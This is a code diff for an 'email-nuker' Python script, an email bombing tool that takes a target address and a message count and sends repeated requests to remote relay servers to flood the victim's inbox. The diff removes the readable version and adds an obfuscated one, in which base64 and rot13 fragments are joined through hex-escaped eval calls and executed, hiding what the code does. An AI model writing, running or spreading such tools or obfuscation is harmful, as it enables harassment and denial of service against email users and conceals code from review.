@@ -1,32 +1,8 @@
-import requests 
-import random
-import os 
-import time
-time.sleep(2)
-os.system("clear")
-print("\n")
-print ("email-nuker version: 2.0")
-print ("github: https://github.com/bagarrattaa/email-nuker ")
-print("this tool is only for educational purposes")
-to=str(input("enter target email to bomb "))
-sub=str(input("enter subject "))
-msg=str(input("enter message "))
-msg=msg.replace(" ","%20")
-sub=sub.replace(" ","%20")
-srvrlist={1:"https://memenuker.herokuapp.com/1",2:"https://memenuker.herokuapp.com/7",3:"https://memenuker.herokuapp.com/6",4:"https://memenuker.herokuapp.com/4",5:"https://memenuker.herokuapp.com/5",6:"https://memenuker.herokuapp.com/6",7:"https://memenuker.herokuapp.com/7",8:"https://memenuker.herokuapp.com/8",9:"https://memenuker.herokuapp.com/9",10:"https://memenuker.herokuapp.com/10",11:"https://memenuker.herokuapp.com/11",12:"https://memenuker.herokuapp.com/1",13:"https://memenuker.herokuapp.com/13",14:"https://memenuker.herokuapp.com/11",15:"https://memenuker.herokuapp.com/15",16:"https://memenuker.herokuapp.com/16",17:"https://memenuker.herokuapp.com/17",18:"https://memenuker.herokuapp.com/18",19:"https://memenuker.herokuapp.com/1",20:"https://memenuker.herokuapp.com/4",21:"https://memenuker.herokuapp.com/8"}
-am=int(input("enter amount of msgs to send "))
-if "/" in msg: 
-    print("Invalid charactors in message")
-else: 
-    for i in range(0,am): 
-        srvr=random.randint(1,21)
-        time.sleep(5)
-        req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
-        if req.text=="Sent": 
-            print("           ")
-            print (str(i+1)+" msgs sent")
-        else: 
-            print ("failed to send msg ")
-            print("please report this error to developer ")
-            print("the responce reseaved from the server was: "+str(srvr)+req.text)
-            break
+import base64, codecs
+magic = 'aW1wb3J0IHJlcXVlc3RzIAppbXBvcnQgcmFuZG9tCmltcG9ydCBvcyAKaW1wb3J0IHRpbWUKdGltZS5zbGVlcCgyKQpvcy5zeXN0ZW0oImNsZWFyIikKcHJpbnQoIlxuIikKcHJpbnQgKCJlbWFpbC1udWtlciB2ZXJzaW9uOiAyLjAiKQpwcmludCAoImdpdGh1YjogaHR0cHM6Ly9naXRodWIuY29tL2JhZ2FycmF0dGFhL2VtYWlsLW51a2VyICIpCnByaW50KCJ0aGlzIHRvb2wgaXMgb25seSBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZXMiKQp0bz1zdHIoaW5wdXQoImVudGVyIHRhcmdldCBlbWFpbCB0byBib21iICIpKQpzdWI9c3RyKGlucHV0KCJlbnRlciBzdWJqZWN0ICIpKQptc2c9c3RyKGlucHV0KCJlbnRlciBtZXNzYWdlICIpKQptc2c9bXNnLnJlcGxhY2UoIiAiLCIlMjAiKQpzdWI9c3ViLnJlcGxhY2UoIiAiLCIlMjAiKQpzcnZybGlzdD17MToiaHR0cHM6Ly9nZy1udWtlci5oZXJva3VhcHAuY'
+love = '29gYmRvYQV6Vzu0qUOmBv8iM2pgoaIeMKVhnTIlo2g1LKOjYzAioF83VvjmBvWbqUEjpmbiY2qaYJ51n2IlYzuypz9eqJSjpP5wo20iAvVfAQbvnUE0pUZ6Yl9aMl1hqJgypv5bMKWin3IupUNhL29gYmDvYQH6Vzu0qUOmBv8iM2pgoaIeMKVhnTIlo2g1LKOjYzAioF81Vvj2BvWbqUEjpmbiY2qaYJ51n2IlYzuypz9eqJSjpP5wo20iAvVfAmbvnUE0pUZ6Yl9aMl1hqJgypv5bMKWin3IupUNhL29gYmpvYQt6Vzu0qUOmBv8iM2pgoaIeMKVhnTIlo2g1LKOjYzAioF84Vvj5BvWbqUEjpmbiY2qaYJ51n2IlYzuypz9eqJSjpP5wo20iBFVfZGN6Vzu0qUOmBv8iM2pgoaIeMKVhnTIlo2g1LKOjYzAioF8kZPVfZGR6Vzu0qUOmBv8iM2pgoaIeMKVhnTIlo2g1LKOjYzAioF8kZFVfZGV6Vzu0qUOmBv8iM2pgoaIeMKVhnTIlo2g1LKOjYzAioF8kVvjkZmbvnUE0pUZ6Yl9aMl1hqJgypv5bMKWin3IupUNhL29gYm'
+god = 'EzIiwxNDoiaHR0cHM6Ly9nZy1udWtlci5oZXJva3VhcHAuY29tLzExIiwxNToiaHR0cHM6Ly9nZy1udWtlci5oZXJva3VhcHAuY29tLzE1IiwxNjoiaHR0cHM6Ly9nZy1udWtlci5oZXJva3VhcHAuY29tLzE2IiwxNzoiaHR0cHM6Ly9nZy1udWtlci5oZXJva3VhcHAuY29tLzE3IiwxODoiaHR0cHM6Ly9nZy1udWtlci5oZXJva3VhcHAuY29tLzE4IiwxOToiaHR0cHM6Ly9nZy1udWtlci5oZXJva3VhcHAuY29tLzEiLDIwOiJodHRwczovL2dnLW51a2VyLmhlcm9rdWFwcC5jb20vNCIsMjE6Imh0dHBzOi8vZ2ctbnVrZXIuaGVyb2t1YXBwLmNvbS84In0KYW09aW50KGlucHV0KCJlbnRlciBhbW91bnQgb2YgbXNncyB0byBzZW5kICIpKQppZiAiLyIgaW4gbXNnOiAKICAgIHByaW50KCJJbnZhbGlkIGNoYXJhY3RvcnMgaW4gbWVzc2FnZSIpCmVsc2U6IAogICAgZm9yIGkgaW4gcmFuZ2UoMCxhbSk6IAo'
+destiny = 'tVPNtVPNtVUAlqaV9pzShMT9gYaWuozEcoaDbZFjlZFxXVPNtVPNtVPO0nJ1yYaAfMJIjXQHcPvNtVPNtVPNtpzIkCKWypKIyp3EmYzqyqPumpaMloTymqP5aMKDbp3W2pvxeVv9vo21vYlVeqT8eVv8vX3A1LvfvYlVeoKAaXDbtVPNtVPNtVTyzVUWypF50MKu0CG0vH2IhqPV6VNbtVPNtVPNtVPNtVPOjpzyhqPtvVPNtVPNtVPNtVPNvXDbtVPNtVPNtVPNtVPOjpzyhqPNbp3ElXTxeZFxeVvOgp2qmVUAyoaDvXDbtVPNtVPNtVTIfp2H6VNbtVPNtVPNtVPNtVPOjpzyhqPNbVzMunJkyMPO0olOmMJ5xVT1mMlNvXDbtVPNtVPNtVPNtVPOjpzyhqPtvpTkyLKAyVUWypT9lqPO0nTymVTIlpz9lVUEiVTEyqzIfo3OypvNvXDbtVPNtVPNtVPNtVPOjpzyhqPtvqTuyVUWyp3OiozAyVUWyp2IuqzIxVTMlo20tqTuyVUAypaMypvO3LKZ6VPVep3ElXUAlqaVcX3WypF50MKu0XDbtVPNtVPNtVPNtVPOvpzIunjb='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
